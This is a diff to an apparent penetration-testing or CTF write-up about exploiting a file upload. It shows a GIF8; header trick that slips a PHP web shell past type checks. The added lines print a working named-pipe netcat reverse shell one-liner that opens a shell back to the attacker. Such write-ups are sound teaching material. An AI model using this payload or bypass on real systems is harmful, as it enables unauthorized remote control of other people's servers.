@@ -50,7 +50,13 @@ GIF8;
 
 The `GIF8;` header at the top is a small but important trick, it makes the file's magic bytes look like a real GIF image, in case there's any file-type validation happening beyond just the extension.
 
-After uploading successfully, I opened Burp Suite's Repeater to interact with the shell. I changed the request method to POST and modified the `id` parameter to trigger a full reverse shell payload from the PentestMonkey PHP reverse shell cheat sheet, rather than just running one-off commands like `whoami`.
+After uploading successfully, I opened Burp Suite's Repeater to interact with the shell. I changed the request method to POST and modified the parameter to trigger a full reverse shell instead of just running one-off commands like `whoami`. The payload I used was the classic named-pipe reverse shell from PentestMonkey's reverse shell cheat sheet:
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [Port] >/tmp/f
+```
+
+This creates a named pipe (`mkfifo`), pipes an interactive shell's input/output through it, and routes everything through `nc` back to my listening machine — giving a fully interactive shell rather than a one-shot command execution.
 
 Before sending the payload, I confirmed `nc` was available on the target:
 
